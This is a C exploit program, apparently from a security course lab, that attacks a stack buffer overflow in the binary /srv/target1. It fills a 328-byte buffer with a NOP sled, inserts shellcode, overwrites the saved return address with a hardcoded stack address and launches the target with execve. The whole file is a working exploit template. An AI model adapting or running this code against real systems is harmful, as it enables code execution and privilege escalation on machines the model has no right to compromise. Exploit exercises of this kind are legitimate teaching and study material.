#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

int main(void) {
    char *args[3];
    char *env[1];

    int buffsize = 328; // Adjust if necessary based on further stack analysis
    char exploit[buffsize];
    int i;

    // Fill the buffer with NOPs
    memset(exploit, 0x90, buffsize);

    // Copy the shellcode in the middle of the NOP sled
    memcpy(exploit + 90, shellcode, sizeof(shellcode) - 1);

    // Overwrite the return address
    // Choose an address in the NOP sled; change if you find the exact address needed
    uint32_t ret_addr = 0xffffd600; // Adjust based on your stack analysis
    for (i = 292; i < buffsize; i += 4) {
        *(uint32_t *)(exploit + i) = ret_addr;
    }

    args[0] = TARGET;
    args[1] = exploit;
    args[2] = NULL;

    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}